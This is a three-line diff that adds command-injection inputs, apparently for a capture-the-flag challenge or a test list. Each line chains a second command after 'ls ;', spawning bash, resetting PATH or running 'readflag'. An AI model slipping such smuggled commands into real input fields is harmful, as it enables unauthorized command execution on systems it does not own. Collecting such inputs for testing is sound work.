@@ -1,0 +1,3 @@
+ls ; bash
+ls ; export PATH=~
+ls ; readflag
